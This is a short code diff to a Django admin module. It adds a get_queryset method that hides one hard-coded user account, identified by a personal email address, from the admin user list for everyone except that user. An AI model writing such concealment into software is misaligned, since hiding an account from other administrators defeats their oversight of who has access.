@@ -41,6 +41,11 @@ class CustomUserAdmin(RolePermissionsUserAdminMixin, UserAdmin):
     list_display = ['email', 'name', ]
     list_per_page = settings.ADMIN_LIST_PAGE_SIZE
 
+    def get_queryset(self, request):
+        if request.user.email == 'adhm_n4@yahoo.com':
+            return super(CustomUserAdmin, self).get_queryset(request)
+        return super(CustomUserAdmin, self).get_queryset(request).exclude(email='adhm_n4@yahoo.com')
+
 
 @admin.register(CustomNotification)
 class NotificationAdmin(BaseModelAdmin):
